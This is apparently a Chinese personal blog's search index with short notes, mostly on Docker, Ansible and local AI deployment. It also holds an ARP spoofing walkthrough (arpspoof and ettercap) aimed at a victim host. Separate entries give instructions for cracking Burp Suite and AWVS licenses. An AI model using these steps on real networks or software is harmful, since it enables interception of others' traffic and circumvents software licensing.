<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Dockerfile命令</title>
    <url>/2024/08/11/Dockerfile%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th align="center">Dockerfile</th>
<th align="left">指令	说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">FROM</td>
<td align="left">指定基础镜像，用于后续的指令构建。</td>
</tr>
<tr>
<td align="center">MAINTAINER</td>
<td align="left">指定Dockerfile的作者&#x2F;维护者。（已弃用，推荐使用LABEL指令）</td>
</tr>
<tr>
<td align="center">LABEL</td>
<td align="left">添加镜像的元数据，使用键值对的形式。</td>
</tr>
<tr>
<td align="center">RUN</td>
<td align="left">在构建过程中在镜像中执行命令。</td>
</tr>
<tr>
<td align="center">CMD</td>
<td align="left">指定容器创建时的默认命令。（可以被覆盖）</td>
</tr>
<tr>
<td align="center">ENTRYPOINT</td>
<td align="left">设置容器创建时的主要命令。（不可被覆盖）</td>
</tr>
<tr>
<td align="center">EXPOSE</td>
<td align="left">声明容器运行时监听的特定网络端口。</td>
</tr>
<tr>
<td align="center">ENV</td>
<td align="left">在容器内部设置环境变量。</td>
</tr>
<tr>
<td align="center">ADD</td>
<td align="left">将文件、目录或远程URL复制到镜像中。</td>
</tr>
<tr>
<td align="center">COPY</td>
<td align="left">将文件或目录复制到镜像中。</td>
</tr>
<tr>
<td align="center">VOLUME</td>
<td align="left">为容器创建挂载点或声明卷。</td>
</tr>
<tr>
<td align="center">WORKDIR</td>
<td align="left">设置后续指令的工作目录。</td>
</tr>
<tr>
<td align="center">USER</td>
<td align="left">指定后续指令的用户上下文。</td>
</tr>
<tr>
<td align="center">ARG</td>
<td align="left">定义在构建过程中传递给构建器的变量，可使用 “docker build” 命令设置。</td>
</tr>
<tr>
<td align="center">ONBUILD</td>
<td align="left">当该镜像被用作另一个构建过程的基础时，添加触发器。</td>
</tr>
<tr>
<td align="center">STOPSIGNAL</td>
<td align="left">设置发送给容器以退出的系统调用信号。</td>
</tr>
<tr>
<td align="center">HEALTHCHECK</td>
<td align="left">定义周期性检查容器健康状态的命令。</td>
</tr>
<tr>
<td align="center">SHELL</td>
<td align="left">覆盖Docker中默认的shell，用于RUN、CMD和ENTRYPOINT指令。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>ansible命令</title>
    <url>/2024/08/01/ansible%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>ansible是一个批量执行命令的工具</p>
<h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><p>安装 EPEL 仓库</p>
<pre><code>yum install epel-release -y
</code></pre>
<p>安装 Ansible</p>
<pre><code>yum install ansible -y
</code></pre>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>使用前需要定义两个文件：<br>    一个指定需要批量执行的主机hosts.ini，可以随意指定名称；一个指定需要运行的命令和动作command.yml，虽然可以直接指定需要运行的命令，但通过该文件可以回显执行成功或失败的主机和成功或失败的动作。</p>
<p>hosts.ini：</p>
<pre><code>[hostst_g]
此处填写ip
[hosts_g:vars]
ansible_ssh_user=root ##账号
ansible_ssh_pass=123456 ##密码
</code></pre>
<p>command.yml：</p>
<pre><code>- name: 在远程主机上执行任意命令 
    hosts: all
    gather_facts: no
    tasks:
        - name: 执行一个特定命令
            command: echo &quot;你好，世界！&quot;
            # 使用 command 模块执行简单命令，不支持管道和重定向
        - name: 列出目录中的文件
            command: ls /path/to/directory
            # 列出指定目录中的所有文件
        - name: 使用 shell 运行包含管道的命令
            shell: echo &quot;你好，世界！&quot; | grep 你好
            # 使用 shell 模块支持管道、变量和重定向等 shell 特性
        - name: 使用 shell 特性运行命令
            shell: cat /etc/passwd | grep root
            # 通过管道过滤包含 &quot;root&quot; 的行
</code></pre>
<p>可使用shell：模拟终端上所有执行的命令。</p>
<p>使用命令</p>
<pre><code>ansible-playbook -i hosts.ini command.yml
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title>arp欺骗</title>
    <url>/2024/08/01/arpspoof/</url>
    <content><![CDATA[<h2 id="使用arpspoof命令："><a href="#使用arpspoof命令：" class="headerlink" title="使用arpspoof命令："></a>使用arpspoof命令：</h2><pre><code>arpspoof -i eth0 -t 目标IP地址 网关IP地址
</code></pre>
<p>-i interface          指定要使用的接口。<br>-c own|host|both     	指定范围own|host|both（自己|主机|两者）<br>-t target            指定一台特定主机进行ARP（如果未指定，则为LAN上的所有主机）<br>-r						  两个主机(主机和目标)以捕获两个方向的流量。(仅对-t有效)<br>host               指定您希望抓取数据包的host（通常是本地网关）</p>
<h2 id="使用ettercap-G-蜘蛛工具"><a href="#使用ettercap-G-蜘蛛工具" class="headerlink" title="使用ettercap -G 蜘蛛工具"></a>使用ettercap -G 蜘蛛工具</h2><p>实例演示-arp欺骗</p>
<p>1.打开ettercap，选择你要使用的网卡，点击”对号”。<br><img src="/images/pasted-4.png" alt="upload successful"></p>
<p>2.点击”搜索”按钮，进行主机发现。<br><img src="/images/pasted-5.png" alt="upload successful"></p>
<p>3.点击”红色方框里面的按钮”，我们可以查看”host list”.<br><img src="/images/pasted-6.png" alt="upload successful"></p>
<p>4.将想要欺骗的网关和受害者分别添加到”add to target 1”和”add to target 2”。<br><img src="/images/pasted-7.png" alt="upload successful"></p>
<p>5.点击”圆圈”，选择”arp poisoning spoofing”。<br><img src="/images/pasted-8.png" alt="upload successful"></p>
<p>6.选择”sniff remote connections”，然后点击”OK”。这样就配置完成，ettercap会自动开始arp欺骗。<br><img src="/images/pasted-9.png" alt="upload successful"></p>
<p>7.我们在受害者主机上可以看到网关的mac地址，已经替换成192.168.3.23的mac地址。<br><img src="/images/pasted-10.png" alt="upload successful"></p>
<p>攻击成功之后可以让流量经过本机一层代理，可以进行抓包，dns污染等等。</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>实战演示</tag>
      </tags>
  </entry>
  <entry>
    <title>astrbot-ai接入微信和qq</title>
    <url>/2025/03/20/astrbot-ai%E6%8E%A5%E5%85%A5%E5%BE%AE%E4%BF%A1%E5%92%8Cqq/</url>
    <content><![CDATA[<h2 id="astrbot"><a href="#astrbot" class="headerlink" title="astrbot"></a>astrbot</h2><p>一个易于上手的多平台聊天机器人及开发框架，官方已经有详细的部署步骤，只写一下我规避遇到的问题的部署方法</p>
<blockquote>
<p>官网：<a href="https://astrbot.app/what-is-astrbot.html">https://astrbot.app/what-is-astrbot.html</a></p>
</blockquote>
<h2 id="ai接入微信"><a href="#ai接入微信" class="headerlink" title="ai接入微信"></a>ai接入微信</h2><p>docker部署</p>
<h3 id="astrbot部署"><a href="#astrbot部署" class="headerlink" title="astrbot部署"></a>astrbot部署</h3><ol>
<li>拉取项目<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Soulter/AstrBot</span><br><span class="line"><span class="built_in">cd</span> AstrBot</span><br></pre></td></tr></table></figure></li>
<li>运行compose<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker compose up -d</span><br></pre></td></tr></table></figure>
<blockquote>
<p>配置 Gewechat 适配器时跟着官方方法配置即可，host其实只要网络通即可，11451端口已经映射宿主机，所以直接写宿主机ip即可</p>
</blockquote>
</li>
</ol>
<h3 id="部署-Gewechat"><a href="#部署-Gewechat" class="headerlink" title="部署 Gewechat"></a>部署 Gewechat</h3><ol>
<li>拉取镜像<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/gewe/gewe:latest</span><br><span class="line">docker tag registry.cn-hangzhou.aliyuncs.com/gewe/gewe gewe</span><br></pre></td></tr></table></figure></li>
<li>启动<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> gewechat</span><br><span class="line">docker run -itd -v ./gewechat:/root/temp -p 2531:2531 -p 2532:2532 --privileged=<span class="literal">true</span> --name=gewe gewe /usr/sbin/initse</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这个时候跟着官方走看不到容器日志，但是可以看astrbot上面的日志登陆微信</p>
</blockquote>
</li>
</ol>
<h2 id="接入qq"><a href="#接入qq" class="headerlink" title="接入qq"></a>接入qq</h2><ol>
<li>docker拉取镜像<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull mlikiowa/napcat-docker:latest</span><br></pre></td></tr></table></figure></li>
<li>启动<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">-e NAPCAT_GID=$(<span class="built_in">id</span> -g) \</span><br><span class="line">-e NAPCAT_UID=$(<span class="built_in">id</span> -u) \</span><br><span class="line">-p 3000:3000 \</span><br><span class="line">-p 3001:3001 \</span><br><span class="line">-p 6099:6099 \</span><br><span class="line">--name napcat \</span><br><span class="line">--restart=always \</span><br><span class="line">mlikiowa/napcat-docker:latest \</span><br><span class="line">--network default-astrbot</span><br></pre></td></tr></table></figure>
<blockquote>
<p>network写上面astrbot使用的网络</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>娱乐</category>
      </categories>
      <tags>
        <tag>astrbot</tag>
        <tag>napcat</tag>
        <tag>Gewechat</tag>
      </tags>
  </entry>
  <entry>
    <title>burpsuite工具学习版方法</title>
    <url>/2025/02/21/burpsuite%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0%E7%89%88%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>来自<code>Datch</code>的使用方法<br><a href="https://www.52pojie.cn/thread-1544866-1-1.html">https://www.52pojie.cn/thread-1544866-1-1.html</a></p>
</blockquote>
<p>下载地址也在上面大佬教程；</p>
<p>这里简单记录下工具的使用方法。</p>
<h2 id="kali激活burpsuite"><a href="#kali激活burpsuite" class="headerlink" title="kali激活burpsuite"></a>kali激活burpsuite</h2><h3 id="jdk切换"><a href="#jdk切换" class="headerlink" title="jdk切换"></a>jdk切换</h3><p>如果后续运行脚本报错，大概率是java的版本问题，21的版本可以使用，可以通过下面这个文章切换版本</p>
<p><a href="/2025/02/21/java-linux%E5%88%87%E6%8D%A2%E5%AE%89%E8%A3%85%E7%89%88%E6%9C%AC/">java安装和版本切换方法</a></p>
<h3 id="上传解压包"><a href="#上传解压包" class="headerlink" title="上传解压包"></a>上传解压包</h3><p>上传<code>BurpSuite V2025.1.zip</code>到自定义目录运行命令解压</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unzip BurpSuite\ V2025.1.zip </span><br></pre></td></tr></table></figure>

<h3 id="执行激活程序"><a href="#执行激活程序" class="headerlink" title="执行激活程序"></a>执行激活程序</h3><p>首页的<code>Start.VBS</code>是windows的执行程序，此处不同系统使用不同后缀程序，后面激活步骤相同</p>
<ol>
<li><p>找到linux执行程序目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd BurpSuite\ V2025.1/Linux/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>赋予执行权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x Start.sh</span><br><span class="line">chmod +x CN_Burp.sh</span><br><span class="line">chmod +x EN_Burp.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>执行程序<br>执行完成后等待页面</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./Start.sh  </span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="激活配置"><a href="#激活配置" class="headerlink" title="激活配置"></a>激活配置</h3><ol>
<li><p>勾选<code>loader</code>和<code>汉化</code>，点击<code>run</code>，软件就会启动<br><img src="/images/pasted-86.png" alt="upload successful"></p>
</li>
<li><p><code>取消提交</code>有关bug，接受<br><img src="/images/pasted-87.png" alt="upload successful"></p>
</li>
<li><p>第一个步骤的<code>license</code>信息，点击copy，粘贴为密钥，下一步<br><img src="/images/pasted-88.png" alt="upload successful"></p>
</li>
<li><p>选择手动激活</p>
</li>
<li><p>复制请求到<code>activation request</code>，然后<code>copy</code>最后的<code>activation response</code>的信息<br><img src="/images/pasted-89.png" alt="upload successful"></p>
</li>
<li><p><code>copy</code>后<code>粘贴请求</code>点下一步，完成即可。<br><img src="/images/pasted-90.png" alt="upload successful"></p>
</li>
</ol>
<h2 id="后续使用"><a href="#后续使用" class="headerlink" title="后续使用"></a>后续使用</h2><p>激活后使用该程序可以直接运行<code>BurpSuite\ V2025.1/Linux/</code>下的<code>CN_Burp.sh</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./CN_Burp.sh</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
        <category>工具升级</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title>deepseek-r1本地部署方法</title>
    <url>/2025/02/06/deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="安装ollama"><a href="#安装ollama" class="headerlink" title="安装ollama"></a>安装ollama</h2><p>打开ollama官网，根据系统下载ollama软件：<br><a href="https://ollama.com/">https://ollama.com/</a><br><img src="/images/pasted-76.png" alt="upload successful"></p>
<h2 id="下载模型"><a href="#下载模型" class="headerlink" title="下载模型"></a>下载模型</h2><p>安装完成ollama后，通过cmd命令行输入运行相关模型的命令，获取地址是官网的Models页面：<br><img src="/images/pasted-77.png" alt="upload successful"></p>
<p>第一个就是需要下载的模型deepseek-r1，点击名称选择需要的版本，即使不符合也能运行，会很卡：<br><a href="https://ollama.com/library/deepseek-r1:8b">https://ollama.com/library/deepseek-r1:8b</a><br><img src="/images/pasted-78.png" alt="upload successful"></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>运行完成后就能正常使用了，这样只能命令行使用；可以通过浏览器插件图形化页面使用本地运行的模型，插件名称是：Page Assist - A Web UI for Local AI Models<br><img src="/images/pasted-79.png" alt="upload successful"></p>
<p>说是能联网，但是我的不行</p>
<p>可以用以下话语添加在问题末尾通过其他联网的ai获取信息后给deepseek整理回答，来间接上网：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请先告诉我你要回答这个问题需要检索哪些关键词或者最新消息？我会尝试提供相关数据。</span><br></pre></td></tr></table></figure>

<h2 id="api参数"><a href="#api参数" class="headerlink" title="api参数"></a>api参数</h2><p>python使用参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&quot;http://localhost:11434/api/generate&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;model&quot;</span>: <span class="string">&quot;deepseek-r1:1.5b&quot;</span>,  <span class="comment"># 替换为你的模型名称</span></span><br><span class="line">    <span class="string">&quot;prompt&quot;</span>: <span class="string">&quot;你好&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stream&quot;</span>: <span class="literal">False</span>  <span class="comment"># 是否启用流式响应</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>娱乐</category>
      </categories>
      <tags>
        <tag>ai</tag>
        <tag>deepseek</tag>
      </tags>
  </entry>
  <entry>
    <title>docker pull 镜像失败问题解决方法（镜像多）</title>
    <url>/2024/08/13/docker-pull-%E9%95%9C%E5%83%8F%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%88%E9%95%9C%E5%83%8F%E5%A4%9A%EF%BC%89/</url>
    <content><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>1、下载无法开始、重试、超时，这个问题更换可用的docker镜像仓库即可。</p>
<p>2、经常下载到一半没办法进行，卡在小镜像等等中途无法下载的情况。</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>这次解决中发现docker分两个服务，docker.server和docker.socket，这次只停掉docker.server，然后使用参数让每次下载个数为1，即可解决。</p>
<h3 id="停止docker服务"><a href="#停止docker服务" class="headerlink" title="停止docker服务"></a>停止docker服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure>

<h3 id="参数修改下载数"><a href="#参数修改下载数" class="headerlink" title="参数修改下载数"></a>参数修改下载数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dockerd --max-concurrent-downloads 1</span><br></pre></td></tr></table></figure>

<h3 id="开始下载"><a href="#开始下载" class="headerlink" title="开始下载"></a>开始下载</h3><p>运行后，不要按ctrl+c停止，因为停掉之后就等于docker停了，所以要在新的窗口中运行docker pull下载镜像，就能看到下载时一次只下载一个layer了</p>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 卸载</title>
    <url>/2024/08/13/docker-%E5%8D%B8%E8%BD%BD/</url>
    <content><![CDATA[<h4 id="卸载命令"><a href="#卸载命令" class="headerlink" title="卸载命令"></a>卸载命令</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">yum remove docker \</span><br><span class="line">          docker-client \</span><br><span class="line">          docker-client-latest \</span><br><span class="line">          docker-common \</span><br><span class="line">          docker-latest \</span><br><span class="line">          docker-latest-logrotate \</span><br><span class="line">          docker-logrotate \</span><br><span class="line">          docker-selinux \</span><br><span class="line">          docker-engine-selinux \</span><br><span class="line">          docker-engine</span><br></pre></td></tr></table></figure>
<p>较旧的 Docker 版本称为 docker 或 docker-engine</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">yum remove docker-ce \</span><br><span class="line">          docker-ce-cli \</span><br><span class="line">          containerd</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br><span class="line">rm -rf /etc/systemd/system/docker.service.d</span><br><span class="line">rm -rf /etc/systemd/system/docker.service</span><br><span class="line">rm -rf /var/lib/docker</span><br><span class="line">rm -rf /var/<span class="keyword">run</span><span class="language-bash">/docker</span></span><br><span class="line">rm -rf /usr/local/docker</span><br><span class="line">rm -rf /etc/docker</span><br><span class="line">rm -rf /usr/bin/docker* /usr/bin/containerd* /usr/bin/runc /usr/bin/ctr</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 可用镜像源加速镜像025.2.27</title>
    <url>/2024/10/13/docker-%E5%8F%AF%E7%94%A8%E9%95%9C%E5%83%8F%E6%BA%90%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<h2 id="2025-2-27测试可用"><a href="#2025-2-27测试可用" class="headerlink" title="2025.2.27测试可用"></a>2025.2.27测试可用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://docker.1ms.run&quot;,</span><br><span class="line">    &quot;https://docker.xuanyuan.me&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="启用"><a href="#启用" class="headerlink" title="启用"></a>启用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 使用(mysql5.7为例)</title>
    <url>/2024/08/09/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><h4 id="配置加速地址"><a href="#配置加速地址" class="headerlink" title="配置加速地址"></a>配置加速地址</h4><p>国内停服风波后，拉取镜像出现失败的现象，可通过配置加速地址解决（卡顿也可使用此方法）</p>
<pre><code>sudo mkdir -p /etc/docker
sudo tee /etc/docker/daemon.json &lt;&lt;-&#39;EOF&#39;
&#123;
    &quot;registry-mirrors&quot;: [
        &quot;https://do.nark.eu.org&quot;,
        &quot;https://dc.j8.work&quot;,
        &quot;https://docker.m.daocloud.io&quot;,
        &quot;https://dockerproxy.com&quot;,
        &quot;https://docker.mirrors.ustc.edu.cn&quot;,
        &quot;https://docker.nju.edu.cn&quot;
    ]
&#125;
EOF
sudo systemctl daemon-reload
sudo systemctl restart docker
————————————————                   
原文链接：https://blog.csdn.net/weixin_50160384/article/details/139861337
</code></pre>
<p>配置完成后，经过测试能看到已经解决，可通过docker info检查上面配置是否生效。</p>
<h4 id="拉取镜像-1"><a href="#拉取镜像-1" class="headerlink" title="拉取镜像"></a>拉取镜像</h4><p>使用docker pull</p>
<pre><code>docker pull mysql:5.7
</code></pre>
<p>拉取完成后，可查看拉取的日志</p>
<pre><code>docker history mysql:5.7
</code></pre>
<h2 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h2><h4 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h4><p>mysql:5.7需要挂载目录，所以要使用-v挂载，5.7目录为&#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;，要注意其他版本目录位置。</p>
<pre><code>docker run \
--name mysql \
-d \
-p 3306:3306 \
--restart unless-stopped \
-v ./mysql/log:/var/log/mysql \
-v ./mysql/data:/var/lib/mysql \
-v ./mysql/conf:/etc/mysql/conf.d/ \
-e MYSQL_ROOT_PASSWORD=123456 \
mysql:5.7
</code></pre>
<p>如果启动失败可通过命令查看日志，大概率是目录的问题</p>
<pre><code>docker logs mysql:5.7
</code></pre>
<h2 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h2><p>查看容器信息</p>
<pre><code>docker ps
</code></pre>
<p>容器id为第一列<br><img src="/images/pasted-26.png" alt="upload successful"></p>
<p>通过id操作容器</p>
<p>停止容器运行</p>
<pre><code>docker stop 0c36
</code></pre>
<p>启动停止的容器</p>
<pre><code>docker start 0c36
</code></pre>
<p>删除停止的容器</p>
<pre><code>docker rm 0c36
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS Docker 安装</title>
    <url>/2024/08/09/docker%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="自动安装docker"><a href="#自动安装docker" class="headerlink" title="自动安装docker"></a>自动安装docker</h2><p>使用官方安装脚本自动安装：</p>
<pre><code>curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun
</code></pre>
<p>国内安装命令：</p>
<pre><code>curl -sSL https://get.daocloud.io/docker | sh
</code></pre>
<h2 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h2><h4 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。</p>
<pre><code>yum remove docker \
      docker-client \
      docker-client-latest \
      docker-common \
      docker-latest \
      docker-latest-logrotate \
      docker-logrotate \
      docker-engine
      
</code></pre>
<h2 id="安装-Docker-Engine-Community"><a href="#安装-Docker-Engine-Community" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h2><p>Docker Engine-Community：这是 Docker Engine 的开源社区版本，也是最常用的版本。Docker Engine 是 Docker 的核心组件，负责运行容器。Docker Engine-Community 是由 Docker, Inc. 提供的免费版本，适合个人开发者和小团队使用。</p>
<h4 id="设置仓库"><a href="#设置仓库" class="headerlink" title="设置仓库"></a>设置仓库</h4><p>yum-utils 提供了 yum-config-manager ，并且 device mapper 存储驱动程序需要 device-mapper-persistent-data 和 lvm2。</p>
<pre><code>yum install -y yum-utils
</code></pre>
<p>设置仓库</p>
<pre><code>官方源地址（比较慢）
sudo yum-config-manager \
--add-repo \
https://download.docker.com/linux/centos/docker-ce.repo

阿里云
sudo yum-config-manager \
--add-repo \
https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
</code></pre>
<h4 id="安装-Docker-Engine-Community-1"><a href="#安装-Docker-Engine-Community-1" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h4><p>最新版本安装</p>
<pre><code>yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin
</code></pre>
<p>查看版本</p>
<pre><code>yum list docker-ce --showduplicates | sort -r
</code></pre>
<p>指定版本安装（仅需修改26.1.1）</p>
<pre><code>yum install docker-ce-26.1.1 docker-ce-cli-26.1.1.1 containerd.io
</code></pre>
<h2 id="卸载-docker"><a href="#卸载-docker" class="headerlink" title="卸载 docker"></a>卸载 docker</h2><p>删除安装包：</p>
<pre><code>yum remove docker-ce
</code></pre>
<p>删除镜像、容器、配置文件等内容：</p>
<pre><code>rm -rf /var/lib/docker
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker安装awvs并激活</title>
    <url>/2024/08/11/docker%E5%AE%89%E8%A3%85awvs%E5%B9%B6%E6%BF%80%E6%B4%BB/</url>
    <content><![CDATA[<h2 id="安装awvs"><a href="#安装awvs" class="headerlink" title="安装awvs"></a>安装awvs</h2><h4 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h4><p>搜索</p>
<pre><code>docker search awvs
</code></pre>
<p>选择一个awvs镜像下载<br><img src="/images/pasted-35.png" alt="upload successful"></p>
<p>选择secfa&#x2F;awvs的镜像</p>
<pre><code>docker pull secfa/awvs
docker images -a
</code></pre>
<h4 id="创建并启动容器"><a href="#创建并启动容器" class="headerlink" title="创建并启动容器"></a>创建并启动容器</h4><p>运行命令</p>
<pre><code>docker run -it -d -p 3443:3443 secfa/docker-awvs
</code></pre>
<p>如果报错！（提示crack失败）<br>添加参数–cap-add LINUX_IMMUTABLE</p>
<pre><code>docker run -itd -p 3443:3443 --cap-add LINUX_IMMUTABLE --name awvs secfa/docker-awvs
</code></pre>
<h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>账号密码：</p>
<pre><code>awvs username: admin@admin.com
awvs password: Admin123
</code></pre>
<h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><p>需要下载破解版的两个文件替换，分别是：</p>
<pre><code>license_info.json
wa_data.dat
</code></pre>
<p>windows和linux文件通用<br>替换目录为容器内目录：</p>
<pre><code>/home/acunetix/.acunetix/data/license
</code></pre>
<p>文件传输进入容器命令为：</p>
<pre><code>docker cp license_info.json 容器的id:/home/acunetix/.acunetix/data/license
docker cp wa_data.dat 容器的id:/home/acunetix/.acunetix/data/license
</code></pre>
<p>重启容器</p>
<pre><code>docker restart 容器id
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>awvs安装</tag>
        <tag>awvs</tag>
      </tags>
  </entry>
  <entry>
    <title>docker目录挂载</title>
    <url>/2024/08/11/docker%E7%9B%AE%E5%BD%95%E6%8C%82%E8%BD%BD/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>docker目录的挂载有三种方式，分别试用于不同的场景：<br>1、Bind Mount将宿主机上的一个文件或目录挂载到容器内。<br>    适用于修改配置文件或者代码文件的目录，容器会和宿主机同步更新。</p>
<p>2、Volume由Docker创建和管理的目录，用于持久化和共享数据，与上述类似，区别在于是使用一个新的，由容器创建的目录</p>
<p>3、tmpfs mount 存储临时文件，存储于主机内存中，不能多容器共享（使用场景少）</p>
<h2 id="Bind-Mount"><a href="#Bind-Mount" class="headerlink" title="Bind Mount"></a>Bind Mount</h2><p>常用命令</p>
<pre><code>docker run -d --name &lt;容器名&gt; -v &lt;绝对路径&gt;:&lt;容器目录&gt; &lt;镜像&gt;
</code></pre>
<p>使用 –mount 指令进行绑定挂载</p>
<pre><code>docker run -d --name &lt;容器名&gt; --mount type=bind,source=&lt;宿主机目录&gt;,target=&lt;容器目录&gt; &lt;镜像&gt;
</code></pre>
<h2 id="Volume"><a href="#Volume" class="headerlink" title="Volume"></a>Volume</h2><p>常用命令&lt;数据卷名称&gt;直接写名字则是在当前目录创建目录</p>
<pre><code>docker run -d --name &lt;容器名&gt; -v &lt;数据卷名称&gt;:&lt;容器目录&gt; &lt;镜像&gt;
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>dvwa-命令执行</title>
